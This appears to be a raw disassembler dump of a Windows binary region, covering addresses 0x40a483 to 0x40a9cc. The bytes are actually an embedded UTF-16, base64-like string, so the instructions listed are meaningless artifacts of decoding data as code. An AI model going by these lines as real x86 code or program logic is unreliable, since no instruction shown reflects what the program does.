  40a483:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a486:	63 00                	arpl   %eax,(%eax)
  40a488:	33 00                	xor    (%eax),%eax
  40a48a:	51                   	push   %ecx
  40a48b:	00 79 00             	add    %bh,0x0(%ecx)
  40a48e:	32 00                	xor    (%eax),%al
  40a490:	43                   	inc    %ebx
  40a491:	00 6e 00             	add    %ch,0x0(%esi)
  40a494:	52                   	push   %edx
  40a495:	00 61 00             	add    %ah,0x0(%ecx)
  40a498:	54                   	push   %esp
  40a499:	00 52 00             	add    %dl,0x0(%edx)
  40a49c:	41                   	inc    %ecx
  40a49d:	00 41 00             	add    %al,0x0(%ecx)
  40a4a0:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  40a4a4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4a5:	00 46 00             	add    %al,0x0(%esi)
  40a4a8:	4f                   	dec    %edi
  40a4a9:	00 4b 00             	add    %cl,0x0(%ebx)
  40a4ac:	56                   	push   %esi
  40a4ad:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a4b0:	70 00                	jo     0x40a4b2
  40a4b2:	30 00                	xor    %al,(%eax)
  40a4b4:	43                   	inc    %ebx
  40a4b5:	00 78 00             	add    %bh,0x0(%eax)
  40a4b8:	55                   	push   %ebp
  40a4b9:	00 63 00             	add    %ah,0x0(%ebx)
  40a4bc:	78 00                	js     0x40a4be
  40a4be:	4a                   	dec    %edx
  40a4bf:	00 76 00             	add    %dh,0x0(%esi)
  40a4c2:	4b                   	dec    %ebx
  40a4c3:	00 46 00             	add    %al,0x0(%esi)
  40a4c6:	34 00                	xor    $0x0,%al
  40a4c8:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  40a4cc:	70 00                	jo     0x40a4ce
  40a4ce:	76 00                	jbe    0x40a4d0
  40a4d0:	57                   	push   %edi
  40a4d1:	00 77 00             	add    %dh,0x0(%edi)
  40a4d4:	48                   	dec    %eax
  40a4d5:	00 6b 00             	add    %ch,0x0(%ebx)
  40a4d8:	36 00 46 00          	add    %al,%ss:0x0(%esi)
  40a4dc:	6d                   	insl   (%dx),%es:(%edi)
  40a4dd:	00 30                	add    %dh,(%eax)
  40a4df:	00 66 00             	add    %ah,0x0(%esi)
  40a4e2:	56                   	push   %esi
  40a4e3:	00 42 00             	add    %al,0x0(%edx)
  40a4e6:	33 00                	xor    (%eax),%eax
  40a4e8:	44                   	inc    %esp
  40a4e9:	00 75 00             	add    %dh,0x0(%ebp)
  40a4ec:	4f                   	dec    %edi
  40a4ed:	00 65 00             	add    %ah,0x0(%ebp)
  40a4f0:	53                   	push   %ebx
  40a4f1:	00 4d 00             	add    %cl,0x0(%ebp)
  40a4f4:	54                   	push   %esp
  40a4f5:	00 2b                	add    %ch,(%ebx)
  40a4f7:	00 52 00             	add    %dl,0x0(%edx)
  40a4fa:	75 00                	jne    0x40a4fc
  40a4fc:	55                   	push   %ebp
  40a4fd:	00 7a 00             	add    %bh,0x0(%edx)
  40a500:	34 00                	xor    $0x0,%al
  40a502:	70 00                	jo     0x40a504
  40a504:	72 00                	jb     0x40a506
  40a506:	64 00 33             	add    %dh,%fs:(%ebx)
  40a509:	00 30                	add    %dh,(%eax)
  40a50b:	00 66 00             	add    %ah,0x0(%esi)
  40a50e:	73 00                	jae    0x40a510
  40a510:	5a                   	pop    %edx
  40a511:	00 7a 00             	add    %bh,0x0(%edx)
  40a514:	4d                   	dec    %ebp
  40a515:	00 64 00 78          	add    %ah,0x78(%eax,%eax,1)
  40a519:	00 55 00             	add    %dl,0x0(%ebp)
  40a51c:	56                   	push   %esi
  40a51d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a520:	77 00                	ja     0x40a522
  40a522:	66 00 56 00          	data16 add %dl,0x0(%esi)
  40a526:	2b 00                	sub    (%eax),%eax
  40a528:	66 00 78 00          	data16 add %bh,0x0(%eax)
  40a52c:	54                   	push   %esp
  40a52d:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  40a531:	00 46 00             	add    %al,0x0(%esi)
  40a534:	62 00                	bound  %eax,(%eax)
  40a536:	47                   	inc    %edi
  40a537:	00 44 00 50          	add    %al,0x50(%eax,%eax,1)
  40a53b:	00 63 00             	add    %ah,0x0(%ebx)
  40a53e:	6b 00 37             	imul   $0x37,(%eax),%eax
  40a541:	00 54 00 35          	add    %dl,0x35(%eax,%eax,1)
  40a545:	00 39                	add    %bh,(%ecx)
  40a547:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40a54b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a54e:	7a 00                	jp     0x40a550
  40a550:	71 00                	jno    0x40a552
  40a552:	48                   	dec    %eax
  40a553:	00 41 00             	add    %al,0x0(%ecx)
  40a556:	52                   	push   %edx
  40a557:	00 6a 00             	add    %ch,0x0(%edx)
  40a55a:	48                   	dec    %eax
  40a55b:	00 75 00             	add    %dh,0x0(%ebp)
  40a55e:	66 00 38             	data16 add %bh,(%eax)
  40a561:	00 2b                	add    %ch,(%ebx)
  40a563:	00 2f                	add    %ch,(%edi)
  40a565:	00 70 00             	add    %dh,0x0(%eax)
  40a568:	45                   	inc    %ebp
  40a569:	00 38                	add    %bh,(%eax)
  40a56b:	00 78 00             	add    %bh,0x0(%eax)
  40a56e:	69 00 44 00 34 00    	imul   $0x340044,(%eax),%eax
  40a574:	78 00                	js     0x40a576
  40a576:	51                   	push   %ecx
  40a577:	00 65 00             	add    %ah,0x0(%ebp)
  40a57a:	78 00                	js     0x40a57c
  40a57c:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40a580:	58                   	pop    %eax
  40a581:	00 68 00             	add    %ch,0x0(%eax)
  40a584:	33 00                	xor    (%eax),%eax
  40a586:	78 00                	js     0x40a588
  40a588:	41                   	inc    %ecx
  40a589:	00 46 00             	add    %al,0x0(%esi)
  40a58c:	6c                   	insb   (%dx),%es:(%edi)
  40a58d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a590:	63 00                	arpl   %eax,(%eax)
  40a592:	36 00 37             	add    %dh,%ss:(%edi)
  40a595:	00 31                	add    %dh,(%ecx)
  40a597:	00 76 00             	add    %dh,0x0(%esi)
  40a59a:	50                   	push   %eax
  40a59b:	00 51 00             	add    %dl,0x0(%ecx)
  40a59e:	69 00 6f 00 71 00    	imul   $0x71006f,(%eax),%eax
  40a5a4:	4c                   	dec    %esp
  40a5a5:	00 78 00             	add    %bh,0x0(%eax)
  40a5a8:	49                   	dec    %ecx
  40a5a9:	00 30                	add    %dh,(%eax)
  40a5ab:	00 55 00             	add    %dl,0x0(%ebp)
  40a5ae:	73 00                	jae    0x40a5b0
  40a5b0:	41                   	inc    %ecx
  40a5b1:	00 43 00             	add    %al,0x0(%ebx)
  40a5b4:	34 00                	xor    $0x0,%al
  40a5b6:	42                   	inc    %edx
  40a5b7:	00 61 00             	add    %ah,0x0(%ecx)
  40a5ba:	45                   	inc    %ebp
  40a5bb:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  40a5bf:	00 57 00             	add    %dl,0x0(%edi)
  40a5c2:	2f                   	das
  40a5c3:	00 36                	add    %dh,(%esi)
  40a5c5:	00 37                	add    %dh,(%edi)
  40a5c7:	00 4a 00             	add    %cl,0x0(%edx)
  40a5ca:	2b 00                	sub    (%eax),%eax
  40a5cc:	55                   	push   %ebp
  40a5cd:	00 59 00             	add    %bl,0x0(%ecx)
  40a5d0:	52                   	push   %edx
  40a5d1:	00 44 00 71          	add    %al,0x71(%eax,%eax,1)
  40a5d5:	00 56 00             	add    %dl,0x0(%esi)
  40a5d8:	4e                   	dec    %esi
  40a5d9:	00 6b 00             	add    %ch,0x0(%ebx)
  40a5dc:	54                   	push   %esp
  40a5dd:	00 73 00             	add    %dh,0x0(%ebx)
  40a5e0:	79 00                	jns    0x40a5e2
  40a5e2:	30 00                	xor    %al,(%eax)
  40a5e4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5e5:	00 4e 00             	add    %cl,0x0(%esi)
  40a5e8:	79 00                	jns    0x40a5ea
  40a5ea:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5eb:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  40a5ef:	00 4d 00             	add    %cl,0x0(%ebp)
  40a5f2:	39 00                	cmp    %eax,(%eax)
  40a5f4:	30 00                	xor    %al,(%eax)
  40a5f6:	33 00                	xor    (%eax),%eax
  40a5f8:	31 00                	xor    %eax,(%eax)
  40a5fa:	49                   	dec    %ecx
  40a5fb:	00 75 00             	add    %dh,0x0(%ebp)
  40a5fe:	67 00 36 00 77       	add    %dh,0x7700
  40a603:	00 46 00             	add    %al,0x0(%esi)
  40a606:	39 00                	cmp    %eax,(%eax)
  40a608:	79 00                	jns    0x40a60a
  40a60a:	54                   	push   %esp
  40a60b:	00 53 00             	add    %dl,0x0(%ebx)
  40a60e:	6d                   	insl   (%dx),%es:(%edi)
  40a60f:	00 66 00             	add    %ah,0x0(%esi)
  40a612:	2f                   	das
  40a613:	00 2b                	add    %ch,(%ebx)
  40a615:	00 55 00             	add    %dl,0x0(%ebp)
  40a618:	56                   	push   %esi
  40a619:	00 2b                	add    %ch,(%ebx)
  40a61b:	00 2f                	add    %ch,(%edi)
  40a61d:	00 31                	add    %dh,(%ecx)
  40a61f:	00 52 00             	add    %dl,0x0(%edx)
  40a622:	57                   	push   %edi
  40a623:	00 45 00             	add    %al,0x0(%ebp)
  40a626:	43                   	inc    %ebx
  40a627:	00 2b                	add    %ch,(%ebx)
  40a629:	00 72 00             	add    %dh,0x0(%edx)
  40a62c:	67 00 4c 00          	add    %cl,0x0(%si)
  40a630:	41                   	inc    %ecx
  40a631:	00 32                	add    %dh,(%edx)
  40a633:	00 44 00 67          	add    %al,0x67(%eax,%eax,1)
  40a637:	00 2b                	add    %ch,(%ebx)
  40a639:	00 4d 00             	add    %cl,0x0(%ebp)
  40a63c:	45                   	inc    %ebp
  40a63d:	00 44 00 6e          	add    %al,0x6e(%eax,%eax,1)
  40a641:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
  40a645:	00 66 00             	add    %ah,0x0(%esi)
  40a648:	33 00                	xor    (%eax),%eax
  40a64a:	49                   	dec    %ecx
  40a64b:	00 5a 00             	add    %bl,0x0(%edx)
  40a64e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a64f:	00 6d 00             	add    %ch,0x0(%ebp)
  40a652:	41                   	inc    %ecx
  40a653:	00 6f 00             	add    %ch,0x0(%edi)
  40a656:	46                   	inc    %esi
  40a657:	00 48 00             	add    %cl,0x0(%eax)
  40a65a:	65 00 64 00 77       	add    %ah,%gs:0x77(%eax,%eax,1)
  40a65f:	00 4c 00 79          	add    %cl,0x79(%eax,%eax,1)
  40a663:	00 30                	add    %dh,(%eax)
  40a665:	00 47 00             	add    %al,0x0(%edi)
  40a668:	6e                   	outsb  %ds:(%esi),(%dx)
  40a669:	00 37                	add    %dh,(%edi)
  40a66b:	00 52 00             	add    %dl,0x0(%edx)
  40a66e:	48                   	dec    %eax
  40a66f:	00 48 00             	add    %cl,0x0(%eax)
  40a672:	72 00                	jb     0x40a674
  40a674:	70 00                	jo     0x40a676
  40a676:	4c                   	dec    %esp
  40a677:	00 39                	add    %bh,(%ecx)
  40a679:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40a67d:	00 6a 00             	add    %ch,0x0(%edx)
  40a680:	72 00                	jb     0x40a682
  40a682:	54                   	push   %esp
  40a683:	00 59 00             	add    %bl,0x0(%ecx)
  40a686:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  40a68a:	2b 00                	sub    (%eax),%eax
  40a68c:	50                   	push   %eax
  40a68d:	00 47 00             	add    %al,0x0(%edi)
  40a690:	68 00 4b 00 67       	push   $0x67004b00
  40a695:	00 36                	add    %dh,(%esi)
  40a697:	00 6d 00             	add    %ch,0x0(%ebp)
  40a69a:	41                   	inc    %ecx
  40a69b:	00 43 00             	add    %al,0x0(%ebx)
  40a69e:	52                   	push   %edx
  40a69f:	00 74 00 76          	add    %dh,0x76(%eax,%eax,1)
  40a6a3:	00 79 00             	add    %bh,0x0(%ecx)
  40a6a6:	4c                   	dec    %esp
  40a6a7:	00 38                	add    %bh,(%eax)
  40a6a9:	00 65 00             	add    %ah,0x0(%ebp)
  40a6ac:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40a6b0:	48                   	dec    %eax
  40a6b1:	00 50 00             	add    %dl,0x0(%eax)
  40a6b4:	72 00                	jb     0x40a6b6
  40a6b6:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  40a6ba:	56                   	push   %esi
  40a6bb:	00 77 00             	add    %dh,0x0(%edi)
  40a6be:	63 00                	arpl   %eax,(%eax)
  40a6c0:	41                   	inc    %ecx
  40a6c1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a6c4:	2f                   	das
  40a6c5:	00 72 00             	add    %dh,0x0(%edx)
  40a6c8:	39 00                	cmp    %eax,(%eax)
  40a6ca:	72 00                	jb     0x40a6cc
  40a6cc:	68 00 37 00 46       	push   $0x46003700
  40a6d1:	00 55 00             	add    %dl,0x0(%ebp)
  40a6d4:	30 00                	xor    %al,(%eax)
  40a6d6:	4e                   	dec    %esi
  40a6d7:	00 35 00 56 00 70    	add    %dh,0x70005600
  40a6dd:	00 53 00             	add    %dl,0x0(%ebx)
  40a6e0:	75 00                	jne    0x40a6e2
  40a6e2:	6a 00                	push   $0x0
  40a6e4:	76 00                	jbe    0x40a6e6
  40a6e6:	68 00 70 00 64       	push   $0x64007000
  40a6eb:	00 53 00             	add    %dl,0x0(%ebx)
  40a6ee:	41                   	inc    %ecx
  40a6ef:	00 33                	add    %dh,(%ebx)
  40a6f1:	00 31                	add    %dh,(%ecx)
  40a6f3:	00 36                	add    %dh,(%esi)
  40a6f5:	00 36                	add    %dh,(%esi)
  40a6f7:	00 67 00             	add    %ah,0x0(%edi)
  40a6fa:	46                   	inc    %esi
  40a6fb:	00 2b                	add    %ch,(%ebx)
  40a6fd:	00 69 00             	add    %ch,0x0(%ecx)
  40a700:	4b                   	dec    %ebx
  40a701:	00 67 00             	add    %ah,0x0(%edi)
  40a704:	2b 00                	sub    (%eax),%eax
  40a706:	63 00                	arpl   %eax,(%eax)
  40a708:	66 00 74 00 50       	data16 add %dh,0x50(%eax,%eax,1)
  40a70d:	00 48 00             	add    %cl,0x0(%eax)
  40a710:	68 00 6c 00 44       	push   $0x44006c00
  40a715:	00 6f 00             	add    %ch,0x0(%edi)
  40a718:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  40a71c:	67 00 4e 00          	add    %cl,0x0(%bp)
  40a720:	43                   	inc    %ebx
  40a721:	00 36                	add    %dh,(%esi)
  40a723:	00 62 00             	add    %ah,0x0(%edx)
  40a726:	4d                   	dec    %ebp
  40a727:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  40a72b:	00 49 00             	add    %cl,0x0(%ecx)
  40a72e:	30 00                	xor    %al,(%eax)
  40a730:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  40a734:	70 00                	jo     0x40a736
  40a736:	42                   	inc    %edx
  40a737:	00 66 00             	add    %ah,0x0(%esi)
  40a73a:	71 00                	jno    0x40a73c
  40a73c:	34 00                	xor    $0x0,%al
  40a73e:	38 00                	cmp    %al,(%eax)
  40a740:	42                   	inc    %edx
  40a741:	00 6c 00 37          	add    %ch,0x37(%eax,%eax,1)
  40a745:	00 70 00             	add    %dh,0x0(%eax)
  40a748:	41                   	inc    %ecx
  40a749:	00 4c 00 6a          	add    %cl,0x6a(%eax,%eax,1)
  40a74d:	00 57 00             	add    %dl,0x0(%edi)
  40a750:	5a                   	pop    %edx
  40a751:	00 33                	add    %dh,(%ebx)
  40a753:	00 76 00             	add    %dh,0x0(%esi)
  40a756:	33 00                	xor    (%eax),%eax
  40a758:	66 00 6a 00          	data16 add %ch,0x0(%edx)
  40a75c:	4b                   	dec    %ebx
  40a75d:	00 33                	add    %dh,(%ebx)
  40a75f:	00 6d 00             	add    %ch,0x0(%ebp)
  40a762:	55                   	push   %ebp
  40a763:	00 6b 00             	add    %ch,0x0(%ebx)
  40a766:	48                   	dec    %eax
  40a767:	00 36                	add    %dh,(%esi)
  40a769:	00 32                	add    %dh,(%edx)
  40a76b:	00 54 00 6d          	add    %dl,0x6d(%eax,%eax,1)
  40a76f:	00 56 00             	add    %dl,0x0(%esi)
  40a772:	34 00                	xor    $0x0,%al
  40a774:	7a 00                	jp     0x40a776
  40a776:	6e                   	outsb  %ds:(%esi),(%dx)
  40a777:	00 68 00             	add    %ch,0x0(%eax)
  40a77a:	77 00                	ja     0x40a77c
  40a77c:	46                   	inc    %esi
  40a77d:	00 72 00             	add    %dh,0x0(%edx)
  40a780:	76 00                	jbe    0x40a782
  40a782:	57                   	push   %edi
  40a783:	00 5a 00             	add    %bl,0x0(%edx)
  40a786:	69 00 4e 00 48 00    	imul   $0x48004e,(%eax),%eax
  40a78c:	57                   	push   %edi
  40a78d:	00 36                	add    %dh,(%esi)
  40a78f:	00 79 00             	add    %bh,0x0(%ecx)
  40a792:	49                   	dec    %ecx
  40a793:	00 46 00             	add    %al,0x0(%esi)
  40a796:	6b 00 61             	imul   $0x61,(%eax),%eax
  40a799:	00 61 00             	add    %ah,0x0(%ecx)
  40a79c:	65 00 4b 00          	add    %cl,%gs:0x0(%ebx)
  40a7a0:	48                   	dec    %eax
  40a7a1:	00 6b 00             	add    %ch,0x0(%ebx)
  40a7a4:	46                   	inc    %esi
  40a7a5:	00 76 00             	add    %dh,0x0(%esi)
  40a7a8:	31 00                	xor    %eax,(%eax)
  40a7aa:	7a 00                	jp     0x40a7ac
  40a7ac:	6c                   	insb   (%dx),%es:(%edi)
  40a7ad:	00 41 00             	add    %al,0x0(%ecx)
  40a7b0:	4c                   	dec    %esp
  40a7b1:	00 41 00             	add    %al,0x0(%ecx)
  40a7b4:	2b 00                	sub    (%eax),%eax
  40a7b6:	66 00 46 00          	data16 add %al,0x0(%esi)
  40a7ba:	38 00                	cmp    %al,(%eax)
  40a7bc:	33 00                	xor    (%eax),%eax
  40a7be:	77 00                	ja     0x40a7c0
  40a7c0:	65 00 64 00 41       	add    %ah,%gs:0x41(%eax,%eax,1)
  40a7c5:	00 43 00             	add    %al,0x0(%ebx)
  40a7c8:	4d                   	dec    %ebp
  40a7c9:	00 4d 00             	add    %cl,0x0(%ebp)
  40a7cc:	77 00                	ja     0x40a7ce
  40a7ce:	68 00 47 00 2b       	push   $0x2b004700
  40a7d3:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  40a7d7:	00 72 00             	add    %dh,0x0(%edx)
  40a7da:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7db:	00 75 00             	add    %dh,0x0(%ebp)
  40a7de:	5a                   	pop    %edx
  40a7df:	00 77 00             	add    %dh,0x0(%edi)
  40a7e2:	73 00                	jae    0x40a7e4
  40a7e4:	48                   	dec    %eax
  40a7e5:	00 71 00             	add    %dh,0x0(%ecx)
  40a7e8:	71 00                	jno    0x40a7ea
  40a7ea:	57                   	push   %edi
  40a7eb:	00 43 00             	add    %al,0x0(%ebx)
  40a7ee:	44                   	inc    %esp
  40a7ef:	00 78 00             	add    %bh,0x0(%eax)
  40a7f2:	72 00                	jb     0x40a7f4
  40a7f4:	53                   	push   %ebx
  40a7f5:	00 63 00             	add    %ah,0x0(%ebx)
  40a7f8:	79 00                	jns    0x40a7fa
  40a7fa:	52                   	push   %edx
  40a7fb:	00 2b                	add    %ch,(%ebx)
  40a7fd:	00 48 00             	add    %cl,0x0(%eax)
  40a800:	76 00                	jbe    0x40a802
  40a802:	39 00                	cmp    %eax,(%eax)
  40a804:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40a808:	74 00                	je     0x40a80a
  40a80a:	6d                   	insl   (%dx),%es:(%edi)
  40a80b:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40a80f:	00 68 00             	add    %ch,0x0(%eax)
  40a812:	47                   	inc    %edi
  40a813:	00 33                	add    %dh,(%ebx)
  40a815:	00 4d 00             	add    %cl,0x0(%ebp)
  40a818:	42                   	inc    %edx
  40a819:	00 48 00             	add    %cl,0x0(%eax)
  40a81c:	72 00                	jb     0x40a81e
  40a81e:	4c                   	dec    %esp
  40a81f:	00 66 00             	add    %ah,0x0(%esi)
  40a822:	56                   	push   %esi
  40a823:	00 79 00             	add    %bh,0x0(%ecx)
  40a826:	63 00                	arpl   %eax,(%eax)
  40a828:	57                   	push   %edi
  40a829:	00 68 00             	add    %ch,0x0(%eax)
  40a82c:	67 00 66 00          	add    %ah,0x0(%bp)
  40a830:	59                   	pop    %ecx
  40a831:	00 31                	add    %dh,(%ecx)
  40a833:	00 54 00 2f          	add    %dl,0x2f(%eax,%eax,1)
  40a837:	00 57 00             	add    %dl,0x0(%edi)
  40a83a:	72 00                	jb     0x40a83c
  40a83c:	61                   	popa
  40a83d:	00 72 00             	add    %dh,0x0(%edx)
  40a840:	67 00 56 00          	add    %dl,0x0(%bp)
  40a844:	42                   	inc    %edx
  40a845:	00 50 00             	add    %dl,0x0(%eax)
  40a848:	71 00                	jno    0x40a84a
  40a84a:	30 00                	xor    %al,(%eax)
  40a84c:	78 00                	js     0x40a84e
  40a84e:	41                   	inc    %ecx
  40a84f:	00 76 00             	add    %dh,0x0(%esi)
  40a852:	43                   	inc    %ebx
  40a853:	00 4e 00             	add    %cl,0x0(%esi)
  40a856:	34 00                	xor    $0x0,%al
  40a858:	42                   	inc    %edx
  40a859:	00 59 00             	add    %bl,0x0(%ecx)
  40a85c:	54                   	push   %esp
  40a85d:	00 62 00             	add    %ah,0x0(%edx)
  40a860:	36 00 36             	add    %dh,%ss:(%esi)
  40a863:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
  40a867:	00 47 00             	add    %al,0x0(%edi)
  40a86a:	30 00                	xor    %al,(%eax)
  40a86c:	74 00                	je     0x40a86e
  40a86e:	51                   	push   %ecx
  40a86f:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40a873:	00 4f 00             	add    %cl,0x0(%edi)
  40a876:	5a                   	pop    %edx
  40a877:	00 41 00             	add    %al,0x0(%ecx)
  40a87a:	69 00 55 00 77 00    	imul   $0x770055,(%eax),%eax
  40a880:	57                   	push   %edi
  40a881:	00 4e 00             	add    %cl,0x0(%esi)
  40a884:	56                   	push   %esi
  40a885:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40a889:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
  40a88d:	00 38                	add    %bh,(%eax)
  40a88f:	00 31                	add    %dh,(%ecx)
  40a891:	00 72 00             	add    %dh,0x0(%edx)
  40a894:	69 00 77 00 74 00    	imul   $0x740077,(%eax),%eax
  40a89a:	5a                   	pop    %edx
  40a89b:	00 62 00             	add    %ah,0x0(%edx)
  40a89e:	53                   	push   %ebx
  40a89f:	00 41 00             	add    %al,0x0(%ecx)
  40a8a2:	37                   	aaa
  40a8a3:	00 4d 00             	add    %cl,0x0(%ebp)
  40a8a6:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40a8aa:	56                   	push   %esi
  40a8ab:	00 4b 00             	add    %cl,0x0(%ebx)
  40a8ae:	4c                   	dec    %esp
  40a8af:	00 6f 00             	add    %ch,0x0(%edi)
  40a8b2:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8b3:	00 6f 00             	add    %ch,0x0(%edi)
  40a8b6:	63 00                	arpl   %eax,(%eax)
  40a8b8:	53                   	push   %ebx
  40a8b9:	00 6a 00             	add    %ch,0x0(%edx)
  40a8bc:	31 00                	xor    %eax,(%eax)
  40a8be:	47                   	inc    %edi
  40a8bf:	00 4f 00             	add    %cl,0x0(%edi)
  40a8c2:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  40a8c6:	43                   	inc    %ebx
  40a8c7:	00 37                	add    %dh,(%edi)
  40a8c9:	00 52 00             	add    %dl,0x0(%edx)
  40a8cc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8cd:	00 57 00             	add    %dl,0x0(%edi)
  40a8d0:	44                   	inc    %esp
  40a8d1:	00 72 00             	add    %dh,0x0(%edx)
  40a8d4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8d5:	00 7a 00             	add    %bh,0x0(%edx)
  40a8d8:	4b                   	dec    %ebx
  40a8d9:	00 6b 00             	add    %ch,0x0(%ebx)
  40a8dc:	57                   	push   %edi
  40a8dd:	00 41 00             	add    %al,0x0(%ecx)
  40a8e0:	4c                   	dec    %esp
  40a8e1:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  40a8e5:	00 5a 00             	add    %bl,0x0(%edx)
  40a8e8:	68 00 37 00 4a       	push   $0x4a003700
  40a8ed:	00 65 00             	add    %ah,0x0(%ebp)
  40a8f0:	55                   	push   %ebp
  40a8f1:	00 4f 00             	add    %cl,0x0(%edi)
  40a8f4:	51                   	push   %ecx
  40a8f5:	00 42 00             	add    %al,0x0(%edx)
  40a8f8:	32 00                	xor    (%eax),%al
  40a8fa:	4a                   	dec    %edx
  40a8fb:	00 6a 00             	add    %ch,0x0(%edx)
  40a8fe:	35 00 34 00 70       	xor    $0x70003400,%eax
  40a903:	00 36                	add    %dh,(%esi)
  40a905:	00 51 00             	add    %dl,0x0(%ecx)
  40a908:	5a                   	pop    %edx
  40a909:	00 4f 00             	add    %cl,0x0(%edi)
  40a90c:	32 00                	xor    (%eax),%al
  40a90e:	4a                   	dec    %edx
  40a90f:	00 4f 00             	add    %cl,0x0(%edi)
  40a912:	30 00                	xor    %al,(%eax)
  40a914:	49                   	dec    %ecx
  40a915:	00 31                	add    %dh,(%ecx)
  40a917:	00 6e 00             	add    %ch,0x0(%esi)
  40a91a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a91b:	00 64 00 34          	add    %ah,0x34(%eax,%eax,1)
  40a91f:	00 56 00             	add    %dl,0x0(%esi)
  40a922:	6b 00 75             	imul   $0x75,(%eax),%eax
  40a925:	00 32                	add    %dh,(%edx)
  40a927:	00 41 00             	add    %al,0x0(%ecx)
  40a92a:	6c                   	insb   (%dx),%es:(%edi)
  40a92b:	00 4e 00             	add    %cl,0x0(%esi)
  40a92e:	41                   	inc    %ecx
  40a92f:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  40a933:	00 58 00             	add    %bl,0x0(%eax)
  40a936:	76 00                	jbe    0x40a938
  40a938:	4c                   	dec    %esp
  40a939:	00 7a 00             	add    %bh,0x0(%edx)
  40a93c:	6c                   	insb   (%dx),%es:(%edi)
  40a93d:	00 48 00             	add    %cl,0x0(%eax)
  40a940:	4a                   	dec    %edx
  40a941:	00 67 00             	add    %ah,0x0(%edi)
  40a944:	58                   	pop    %eax
  40a945:	00 65 00             	add    %ah,0x0(%ebp)
  40a948:	71 00                	jno    0x40a94a
  40a94a:	2b 00                	sub    (%eax),%eax
  40a94c:	2f                   	das
  40a94d:	00 74 00 46          	add    %dh,0x46(%eax,%eax,1)
  40a951:	00 4a 00             	add    %cl,0x0(%edx)
  40a954:	76 00                	jbe    0x40a956
  40a956:	75 00                	jne    0x40a958
  40a958:	56                   	push   %esi
  40a959:	00 42 00             	add    %al,0x0(%edx)
  40a95c:	63 00                	arpl   %eax,(%eax)
  40a95e:	55                   	push   %ebp
  40a95f:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40a963:	00 77 00             	add    %dh,0x0(%edi)
  40a966:	39 00                	cmp    %eax,(%eax)
  40a968:	37                   	aaa
  40a969:	00 35 00 4c 00 31    	add    %dh,0x31004c00
  40a96f:	00 4b 00             	add    %cl,0x0(%ebx)
  40a972:	32 00                	xor    (%eax),%al
  40a974:	41                   	inc    %ecx
  40a975:	00 77 00             	add    %dh,0x0(%edi)
  40a978:	53                   	push   %ebx
  40a979:	00 51 00             	add    %dl,0x0(%ecx)
  40a97c:	31 00                	xor    %eax,(%eax)
  40a97e:	34 00                	xor    $0x0,%al
  40a980:	71 00                	jno    0x40a982
  40a982:	43                   	inc    %ebx
  40a983:	00 5a 00             	add    %bl,0x0(%edx)
  40a986:	4e                   	dec    %esi
  40a987:	00 30                	add    %dh,(%eax)
  40a989:	00 36                	add    %dh,(%esi)
  40a98b:	00 58 00             	add    %bl,0x0(%eax)
  40a98e:	6c                   	insb   (%dx),%es:(%edi)
  40a98f:	00 58 00             	add    %bl,0x0(%eax)
  40a992:	62 00                	bound  %eax,(%eax)
  40a994:	65 00 44 00 5a       	add    %al,%gs:0x5a(%eax,%eax,1)
  40a999:	00 4d 00             	add    %cl,0x0(%ebp)
  40a99c:	7a 00                	jp     0x40a99e
  40a99e:	30 00                	xor    %al,(%eax)
  40a9a0:	35 00 45 00 57       	xor    $0x57004500,%eax
  40a9a5:	00 66 00             	add    %ah,0x0(%esi)
  40a9a8:	46                   	inc    %esi
  40a9a9:	00 73 00             	add    %dh,0x0(%ebx)
  40a9ac:	49                   	dec    %ecx
  40a9ad:	00 52 00             	add    %dl,0x0(%edx)
  40a9b0:	4a                   	dec    %edx
  40a9b1:	00 6f 00             	add    %ch,0x0(%edi)
  40a9b4:	70 00                	jo     0x40a9b6
  40a9b6:	68 00 6a 00 46       	push   $0x46006a00
  40a9bb:	00 38                	add    %bh,(%eax)
  40a9bd:	00 4f 00             	add    %cl,0x0(%edi)
  40a9c0:	71 00                	jno    0x40a9c2
  40a9c2:	39 00                	cmp    %eax,(%eax)
  40a9c4:	6c                   	insb   (%dx),%es:(%edi)
  40a9c5:	00 7a 00             	add    %bh,0x0(%edx)
  40a9c8:	52                   	push   %edx
  40a9c9:	00 65 00             	add    %ah,0x0(%ebp)
  40a9cc:	47                   	inc    %edi
